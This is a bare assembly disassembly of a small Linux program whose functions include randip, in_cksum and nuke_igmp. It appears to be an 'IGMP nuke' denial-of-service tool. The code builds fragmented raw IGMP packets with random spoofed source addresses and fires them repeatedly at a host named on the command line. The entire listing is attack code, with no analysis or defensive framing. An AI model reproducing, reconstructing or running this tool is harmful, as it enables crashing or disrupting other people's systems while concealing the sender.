push   ebp
mov    ebp,esp
push   ebx
call   80486c9 <_init+0x9>
pop    ebx
add    ebx,0x1847
cmp    DWORD PTR [ebx+0x6c],0x0
je     80486de <_init+0x1e>
call   0 <_init-0x80486c0>
mov    esi,esi
call   8048e40 <__do_global_ctors_aux>
mov    ebx,DWORD PTR [ebp-0x4]
mov    esp,ebp
pop    ebp
ret    
push   DWORD PTR ds:0x8049f14
jmp    DWORD PTR ds:0x8049f18
add    BYTE PTR [eax],al
jmp    DWORD PTR ds:0x8049f1c
push   0x0
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f20
push   0x8
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f24
push   0x10
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f28
push   0x18
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f2c
push   0x20
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f30
push   0x28
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f34
push   0x30
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f38
push   0x38
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f3c
push   0x40
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f40
push   0x48
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f44
push   0x50
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f48
push   0x58
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f4c
push   0x60
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f50
push   0x68
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f54
push   0x70
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f58
push   0x78
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f5c
push   0x80
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f60
push   0x88
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f64
push   0x90
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f68
push   0x98
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f6c
push   0xa0
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f70
push   0xa8
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f74
push   0xb0
jmp    80486ec <.plt>
jmp    DWORD PTR ds:0x8049f78
push   0xb8
jmp    80486ec <.plt>
xor    ebp,ebp
test   edx,edx
je     8048889 <_start+0xd>
push   edx
call   804881c <atexit@plt>
pop    eax
call   804879c <__libc_init_first@plt>
pop    esi
lea    eax,[esp+esi*4+0x4]
mov    ds:0x804a058,eax
mov    edx,esp
and    esp,0xfffffff8
push   eax
push   eax
push   edx
push   esi
call   80486c0 <_init>
push   0x8048e70
call   804881c <atexit@plt>
pop    eax
call   8048d28 <main>
push   eax
call   804884c <exit@plt>
hlt    
nop
nop
nop
push   ebp
mov    ebp,esp
push   ebx
mov    ebx,0x8049f0c
cmp    DWORD PTR ds:0x8049f0c,0x0
je     80488e0 <__do_global_dtors_aux+0x20>
mov    esi,esi
mov    eax,DWORD PTR [ebx]
call   eax
add    ebx,0x4
cmp    DWORD PTR [ebx],0x0
jne    80488d4 <__do_global_dtors_aux+0x14>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
leave  
ret    
nop
nop
nop
push   ebp
mov    ebp,esp
push   0x8048e8c
call   80486fc <printf@plt>
add    esp,0x4
mov    eax,DWORD PTR [ebp+0x8]
push   eax
push   0x8048eae
call   80486fc <printf@plt>
add    esp,0x8
push   0x1
call   804884c <exit@plt>
add    esp,0x4
nop
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x18
push   ebx
push   0x10
push   0x1
call   804878c <calloc@plt>
add    esp,0x8
mov    DWORD PTR [ebp-0x18],eax
call   804870c <random@plt>
mov    ecx,eax
mov    eax,ecx
mov    ebx,0xfd
cdq    
idiv   ebx
lea    ecx,[edx+0x1]
push   ecx
call   804870c <random@plt>
mov    ecx,eax
mov    eax,ecx
mov    ebx,0xfd
cdq    
idiv   ebx
lea    ecx,[edx+0x1]
push   ecx
call   804870c <random@plt>
mov    ecx,eax
mov    eax,ecx
mov    ebx,0xfd
cdq    
idiv   ebx
lea    ecx,[edx+0x1]
push   ecx
call   804870c <random@plt>
mov    ecx,eax
mov    eax,ecx
mov    ebx,0xbf
cdq    
idiv   ebx
lea    ecx,[edx+0x17]
push   ecx
push   0x8048ec2
mov    eax,DWORD PTR [ebp-0x18]
push   eax
call   804880c <sprintf@plt>
add    esp,0x18
lea    eax,[ebp-0x14]
push   eax
mov    eax,DWORD PTR [ebp-0x18]
push   eax
call   80487bc <inet_aton@plt>
add    esp,0x8
mov    eax,DWORD PTR [ebp-0x10]
jmp    80489b0 <randip+0x90>
mov    ebx,DWORD PTR [ebp-0x1c]
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x4
push   ebx
xor    edx,edx
cmp    DWORD PTR [ebp+0xc],0x1
jg     80489cc <in_cksum+0x14>
jmp    80489e0 <in_cksum+0x28>
lea    esi,[esi+0x0]
mov    eax,DWORD PTR [ebp+0x8]
movzx  ebx,WORD PTR [eax]
add    edx,ebx
add    DWORD PTR [ebp+0x8],0x2
add    DWORD PTR [ebp+0xc],0xfffffffe
jmp    80489c1 <in_cksum+0x9>
mov    esi,esi
cmp    DWORD PTR [ebp+0xc],0x1
jne    80489fa <in_cksum+0x42>
mov    WORD PTR [ebp-0x2],0x0
mov    eax,DWORD PTR [ebp+0x8]
mov    bl,BYTE PTR [eax]
mov    BYTE PTR [ebp-0x2],bl
movzx  eax,WORD PTR [ebp-0x2]
add    edx,eax
mov    eax,edx
sar    eax,0x10
movzx  ebx,dx
lea    edx,[ebx+eax*1]
mov    eax,edx
sar    eax,0x10
add    edx,eax
mov    ecx,edx
not    cx
movzx  ebx,cx
mov    eax,ebx
jmp    8048a18 <in_cksum+0x60>
mov    ebx,DWORD PTR [ebp-0x8]
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x28
push   ebx
mov    DWORD PTR [ebp-0x4],0x5dc
call   804870c <random@plt>
mov    ecx,eax
mov    eax,ecx
mov    ebx,0x9c40
cdq    
idiv   ebx
mov    DWORD PTR [ebp-0x28],edx
mov    edx,DWORD PTR [ebp-0x28]
add    edx,0x1f4
mov    DWORD PTR [ebp-0x24],edx
mov    eax,DWORD PTR [ebp-0x4]
push   eax
push   0x1
call   804878c <calloc@plt>
add    esp,0x8
mov    DWORD PTR [ebp-0x8],eax
mov    eax,DWORD PTR [ebp-0x8]
mov    DWORD PTR [ebp-0xc],eax
mov    ebx,DWORD PTR [ebp-0x8]
add    ebx,0x14
mov    DWORD PTR [ebp-0x10],ebx
mov    eax,DWORD PTR [ebp-0xc]
and    BYTE PTR [eax],0xf
or     BYTE PTR [eax],0x40
mov    eax,DWORD PTR [ebp-0xc]
and    BYTE PTR [eax],0xf0
or     BYTE PTR [eax],0x5
mov    eax,DWORD PTR [ebp-0xc]
mov    BYTE PTR [eax+0x8],0xff
movzx  eax,WORD PTR [ebp-0x4]
push   eax
call   804883c <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR [ebp-0xc]
mov    DWORD PTR [ebp-0x28],edx
mov    ebx,DWORD PTR [ebp-0x28]
mov    WORD PTR [ebx+0x2],ax
mov    eax,DWORD PTR [ebp-0xc]
mov    BYTE PTR [eax+0x9],0x2
movzx  eax,WORD PTR [ebp-0x24]
push   eax
call   804883c <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR [ebp-0xc]
mov    DWORD PTR [ebp-0x28],edx
mov    ebx,DWORD PTR [ebp-0x28]
mov    WORD PTR [ebx+0x4],ax
push   0x2000
call   804883c <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR [ebp-0xc]
mov    DWORD PTR [ebp-0x28],edx
mov    ebx,DWORD PTR [ebp-0x28]
mov    WORD PTR [ebx+0x6],ax
mov    eax,DWORD PTR [ebp-0xc]
mov    edx,DWORD PTR [ebp+0xc]
mov    DWORD PTR [ebp-0x28],edx
mov    ebx,DWORD PTR [ebp-0x28]
mov    DWORD PTR [eax+0xc],ebx
mov    eax,DWORD PTR [ebp-0xc]
mov    edx,DWORD PTR [ebp+0x8]
mov    DWORD PTR [ebp-0x28],edx
mov    ebx,DWORD PTR [ebp-0x28]
mov    ecx,DWORD PTR [ebx+0x4]
mov    DWORD PTR [eax+0x10],ecx
push   0x14
mov    eax,DWORD PTR [ebp-0xc]
push   eax
call   80489b8 <in_cksum>
add    esp,0x8
mov    eax,eax
mov    edx,DWORD PTR [ebp-0xc]
mov    DWORD PTR [ebp-0x28],edx
mov    ebx,DWORD PTR [ebp-0x28]
mov    WORD PTR [ebx+0xa],ax
mov    eax,DWORD PTR [ebp-0x10]
mov    BYTE PTR [eax],0x0
mov    eax,DWORD PTR [ebp-0x10]
mov    DWORD PTR [eax+0x4],0x0
push   0x8
mov    eax,DWORD PTR [ebp-0x10]
push   eax
call   80489b8 <in_cksum>
add    esp,0x8
mov    eax,eax
mov    edx,DWORD PTR [ebp-0x10]
mov    DWORD PTR [ebp-0x28],edx
mov    ebx,DWORD PTR [ebp-0x28]
mov    WORD PTR [ebx+0x2],ax
mov    DWORD PTR [ebp-0x1c],0x1d
mov    eax,DWORD PTR [ebp-0x1c]
cmp    DWORD PTR [ebp-0x4],eax
jg     8048b60 <nuke_igmp+0x140>
jmp    8048b84 <nuke_igmp+0x164>
mov    esi,esi
call   804870c <random@plt>
mov    eax,eax
mov    edx,DWORD PTR [ebp-0x8]
add    edx,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [ebp-0x28],edx
mov    ebx,0xff
cdq    
idiv   ebx
mov    ecx,edx
mov    edx,DWORD PTR [ebp-0x28]
mov    BYTE PTR [edx],cl
inc    DWORD PTR [ebp-0x1c]
jmp    8048b54 <nuke_igmp+0x134>
mov    ebx,DWORD PTR [ebp-0x8]
add    ebx,0x44
mov    DWORD PTR [ebp-0x14],ebx
mov    eax,DWORD PTR [ebp-0x14]
push   eax
call   804877c <uname@plt>
add    esp,0x4
mov    edx,DWORD PTR [ebp-0x14]
add    edx,0x190
mov    DWORD PTR [ebp-0x18],edx
push   0x1c
call   804874c <getuid@plt>
mov    eax,eax
push   eax
call   80487ec <getpwuid@plt>
add    esp,0x4
mov    eax,eax
push   eax
mov    eax,DWORD PTR [ebp-0x18]
push   eax
call   804872c <memcpy@plt>
add    esp,0xc
push   0xff
push   0x3
push   0x2
call   804875c <socket@plt>
add    esp,0xc
mov    eax,eax
mov    DWORD PTR [ebp-0x20],eax
cmp    DWORD PTR [ebp-0x20],0x0
jge    8048bfc <nuke_igmp+0x1dc>
push   0x8048ece
call   804873c <perror@plt>
add    esp,0x4
mov    eax,0x1
jmp    8048d20 <nuke_igmp+0x300>
lea    esi,[esi+0x0]
push   0x10
mov    eax,DWORD PTR [ebp+0x8]
push   eax
push   0x0
mov    eax,DWORD PTR [ebp-0x4]
push   eax
mov    eax,DWORD PTR [ebp-0x8]
push   eax
mov    eax,DWORD PTR [ebp-0x20]
push   eax
call   80487ac <sendto@plt>
add    esp,0x18
mov    eax,eax
cmp    eax,0xffffffff
jne    8048c38 <nuke_igmp+0x218>
push   0x8048ede
call   804873c <perror@plt>
add    esp,0x4
mov    eax,0x1
jmp    8048d20 <nuke_igmp+0x300>
mov    esi,esi
push   0xf4240
call   804871c <usleep@plt>
add    esp,0x4
mov    DWORD PTR [ebp-0x1c],0x1
cmp    DWORD PTR [ebp-0x1c],0x4
jle    8048c58 <nuke_igmp+0x238>
jmp    8048d04 <nuke_igmp+0x2e4>
nop
cmp    DWORD PTR [ebp-0x1c],0x3
jle    8048c98 <nuke_igmp+0x278>
mov    eax,DWORD PTR [ebp-0x4]
add    eax,0xffffffec
mov    ebx,eax
imul   ebx,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [ebp-0x28],ebx
mov    eax,DWORD PTR [ebp-0x28]
sar    eax,0x3
movzx  edx,ax
mov    DWORD PTR [ebp-0x28],edx
push   DWORD PTR [ebp-0x28]
call   804883c <htons@plt>
add    esp,0x4
mov    eax,eax
mov    ebx,DWORD PTR [ebp-0xc]
mov    DWORD PTR [ebp-0x28],ebx
mov    edx,DWORD PTR [ebp-0x28]
mov    WORD PTR [edx+0x6],ax
jmp    8048cd2 <nuke_igmp+0x2b2>
lea    esi,[esi+0x0]
mov    eax,DWORD PTR [ebp-0x4]
add    eax,0xffffffec
mov    ebx,eax
imul   ebx,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [ebp-0x28],ebx
mov    eax,DWORD PTR [ebp-0x28]
sar    eax,0x3
mov    edx,eax
or     dh,0x20
mov    WORD PTR [ebp-0x28],dx
movzx  eax,WORD PTR [ebp-0x28]
push   eax
call   804883c <htons@plt>
add    esp,0x4
mov    eax,eax
mov    ebx,DWORD PTR [ebp-0xc]
mov    DWORD PTR [ebp-0x28],ebx
mov    edx,DWORD PTR [ebp-0x28]
mov    WORD PTR [edx+0x6],ax
push   0x10
mov    eax,DWORD PTR [ebp+0x8]
push   eax
push   0x0
mov    eax,DWORD PTR [ebp-0x4]
push   eax
mov    eax,DWORD PTR [ebp-0x8]
push   eax
mov    eax,DWORD PTR [ebp-0x20]
push   eax
call   80487ac <sendto@plt>
add    esp,0x18
push   0x1e8480
call   804871c <usleep@plt>
add    esp,0x4
inc    DWORD PTR [ebp-0x1c]
jmp    8048c4c <nuke_igmp+0x22c>
nop
mov    eax,DWORD PTR [ebp-0x8]
push   eax
call   804886c <free@plt>
add    esp,0x4
mov    eax,DWORD PTR [ebp-0x20]
push   eax
call   804885c <close@plt>
add    esp,0x4
xor    eax,eax
jmp    8048d20 <nuke_igmp+0x300>
mov    ebx,DWORD PTR [ebp-0x2c]
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x18
push   0x0
call   80487cc <time@plt>
add    esp,0x4
mov    eax,eax
push   eax
call   804882c <srandom@plt>
add    esp,0x4
cmp    DWORD PTR [ebp+0x8],0x1
jg     8048d57 <main+0x2f>
mov    eax,DWORD PTR [ebp+0xc]
mov    edx,DWORD PTR [eax]
push   edx
call   80488f0 <usage>
add    esp,0x4
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0x4
mov    edx,DWORD PTR [eax]
push   edx
call   80487fc <gethostbyname@plt>
add    esp,0x4
mov    eax,eax
mov    DWORD PTR [ebp-0x14],eax
cmp    DWORD PTR [ebp-0x14],0x0
jne    8048d90 <main+0x68>
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0x4
mov    edx,DWORD PTR [eax]
push   edx
call   80487dc <herror@plt>
add    esp,0x4
push   0x1
call   804884c <exit@plt>
add    esp,0x4
mov    esi,esi
mov    eax,DWORD PTR [ebp-0x14]
mov    edx,DWORD PTR [eax+0xc]
push   edx
mov    eax,DWORD PTR [ebp-0x14]
mov    edx,DWORD PTR [eax+0x10]
mov    eax,DWORD PTR [edx]
push   eax
lea    eax,[ebp-0x10]
lea    edx,[eax+0x4]
push   edx
call   804872c <memcpy@plt>
add    esp,0xc
push   0x0
call   804883c <htons@plt>
add    esp,0x4
mov    eax,eax
mov    WORD PTR [ebp-0xe],ax
mov    WORD PTR [ebp-0x10],0x2
push   0x8048eee
call   80486fc <printf@plt>
add    esp,0x4
push   0x804a008
call   804876c <fflush@plt>
add    esp,0x4
mov    DWORD PTR [ebp-0x18],0x0
cmp    DWORD PTR [ebp-0x18],0x9
jle    8048df0 <main+0xc8>
jmp    8048e24 <main+0xfc>
mov    esi,esi
call   8048920 <randip>
mov    eax,eax
push   eax
lea    eax,[ebp-0x10]
push   eax
call   8048a20 <nuke_igmp>
add    esp,0x8
push   0x8048ef5
call   80486fc <printf@plt>
add    esp,0x4
push   0x804a008
call   804876c <fflush@plt>
add    esp,0x4
inc    DWORD PTR [ebp-0x18]
jmp    8048de6 <main+0xbe>
nop
push   0x8048ef7
call   80486fc <printf@plt>
add    esp,0x4
push   0x804a008
call   804876c <fflush@plt>
add    esp,0x4
leave  
ret    
push   ebp
mov    ebp,esp
push   ebx
mov    ebx,0x8049f00
cmp    DWORD PTR ds:0x8049f00,0xffffffff
je     8048e60 <__do_global_ctors_aux+0x20>
mov    esi,esi
mov    eax,DWORD PTR [ebx]
call   eax
add    ebx,0xfffffffc
cmp    DWORD PTR [ebx],0xffffffff
jne    8048e54 <__do_global_ctors_aux+0x14>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
leave  
ret    
nop
nop
nop
push   ebp
mov    ebp,esp
push   ebx
call   8048e79 <_fini+0x9>
pop    ebx
add    ebx,0x1097
call   80488c0 <__do_global_dtors_aux>
mov    ebx,DWORD PTR [ebp-0x4]
mov    esp,ebp
pop    ebp
ret    
